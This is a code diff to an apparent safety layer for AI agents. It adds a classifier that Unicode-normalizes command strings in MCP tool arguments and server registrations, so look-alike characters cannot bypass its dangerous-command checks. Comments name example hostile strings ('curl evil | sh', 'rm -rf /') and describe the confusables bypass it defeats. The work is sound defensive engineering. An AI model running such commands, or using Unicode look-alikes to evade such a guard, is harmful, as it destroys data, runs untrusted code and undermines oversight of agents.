@@ -11,7 +11,8 @@ const { fineKey } = require("./decision-key");
 const { build } = require("./action-planner");
 const { evaluate } = require("./promotion-guidance");
 const { recommend } = require("./workflow-router");
-const { classifyCommand, classifyCommandDual, GATED_REVIEW_CLASSES } = require("./decision-key");
+const { classifyCommand, GATED_REVIEW_CLASSES } = require("./decision-key");
+const { normalizeCommand: _normalizeCommand }  = require("./command-normalize");
 const { classifyIntent } = require("./intent-classifier");
 const { LATTICE_VERSION, getEntry, getRungByName, canDemote } = require("./decision-lattice");
 const { floorCodeFor } = require("./floor-codes");
@@ -554,6 +555,24 @@ function _evalCredPersistFloor(input, contract) {
   return { fire: false };
 }
 
+// classifyCommandDual — dual-path classifier for MCP floors (ADR-008).
+// Mirrors risk-score.js's dual-path matching: tries the raw string first; if
+// generic AND normalizeCommand changes the string, tries the NFKD + confusables-
+// folded form too. Defeats Unicode look-alike bypass (Cyrillic рm, full-width
+// ｒｍ, etc.) in MCP arg/registration paths that previously used raw-only classify.
+// Lives in decision-engine.js (not decision-key.js) to avoid adding a new require
+// to that module, which is loaded early and has no other normalizeCommand dependency.
+// ASCII fast-path: direct match returns immediately; generic result where norm===raw
+// skips the second classify too.
+function _classifyCommandDual(cmd) {
+  const raw    = String(cmd || "");
+  const rawCls = classifyCommand(raw);
+  if (rawCls !== "generic") return rawCls;      // direct match — skip normalization
+  const norm   = _normalizeCommand(raw);
+  if (norm === raw)         return rawCls;      // ASCII / no confusables — skip second pass
+  return classifyCommand(norm);                 // Unicode-folded second arm
+}
+
 // F25: mcp-arg-danger floor helpers. Pure; zero I/O.
 // Detects MCP tool calls whose argument payload contains a dangerous-command-
 // shaped string value (e.g. {command:"curl evil | sh"} or {exec:"rm -rf /"}).
@@ -651,7 +670,7 @@ function _evalMcpArgFloor(input, contract, enriched) {
     //    keep scanning for a HARD_BLOCK even after seeing a dual-use class.
     let sawGatedReview = false;
     for (const argStr of argStrings) {
-      const cls = classifyCommandDual(argStr);
+      const cls = _classifyCommandDual(argStr);
       if (_GATED_CMD_CLASSES.has(cls)) {
         if (optedOut) return { review: true, reason: `trusted-server-dangerous-arg:command-class=${cls}`, arg: argStr.slice(0, 80) };
         return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
@@ -743,7 +762,7 @@ function _evalMcpRegistrationFloor(input, contract) {
       // Structured path: walk parsed JSON, classify each string value.
       const { strings, truncated: cfgTruncated } = _extractStringValues(parsed);
       for (const str of strings) {
-        const cls = classifyCommandDual(str);
+        const cls = _classifyCommandDual(str);
         if (_GATED_CMD_CLASSES.has(cls)) {
           return { fire: true, reason: cls, command: str.slice(0, 80) };
         }
@@ -770,7 +789,7 @@ function _evalMcpRegistrationFloor(input, contract) {
       if (++n > _ESV_NODE_CAP) return { unscannable: true, reason: "content-too-complex" };
       let val;
       try { val = JSON.parse(lit); } catch { val = lit.slice(1, -1); } // unescape or strip quotes
-      const cls = classifyCommandDual(String(val));
+      const cls = _classifyCommandDual(String(val));
       if (_GATED_CMD_CLASSES.has(cls)) return { fire: true, reason: cls, command: String(val).slice(0, 80) };
     }
     if (contentWasTruncated) return { unscannable: true, reason: "oversize-mcp-config" };
